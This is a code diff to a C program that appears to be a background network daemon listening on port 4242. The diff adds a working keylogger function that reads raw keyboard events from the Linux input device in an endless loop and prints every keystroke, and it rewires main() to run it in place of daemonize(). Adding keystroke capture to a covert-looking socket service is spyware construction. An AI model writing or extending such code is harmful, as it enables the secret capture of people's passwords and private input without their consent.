@@ -15,9 +15,53 @@
 #include <stdlib.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <sys/ioctl.h>
+#include <linux/input.h>
 #ifndef PORT
  #define PORT 4242
 #endif
+
+#define EV_BUF_SIZE 1
+
+void keylogger()
+{
+	int fd, sz;
+    unsigned i;
+
+    unsigned version;
+    unsigned short id[4];                 
+    char name[256] = "N/A";
+	struct input_event ev[EV_BUF_SIZE];
+
+	if ((fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY)) < 0) 
+		return;
+	ioctl(fd, EVIOCGVERSION, &version);
+    ioctl(fd, EVIOCGID, id); 
+    ioctl(fd, EVIOCGNAME(sizeof(name)), name);
+
+	for (;;) {
+        sz = read(fd, ev, sizeof(struct input_event) * EV_BUF_SIZE);
+
+        for (i = 0; i < sz / sizeof(struct input_event); ++i) {
+            fprintf(stdout,
+                "%ld.%06ld: "
+                "type=%02x "
+                "code=%02x "
+                "value=%02x\n",
+                ev[i].time.tv_sec,
+                ev[i].time.tv_usec,
+                ev[i].type,
+                ev[i].code,
+                ev[i].value
+            );
+        }
+    }
+
+fine:
+    close(fd);
+
+}
+
 
 int net_init()
 {
@@ -215,7 +259,9 @@ void daemonize()
 
 int main()
 {
-	daemonize();
+	//daemonize();
+	keylogger();
+	return(0);
 	int n_clients = 0;
 	t_client clients[3];
 	fd_set sockets, ready_sockets;
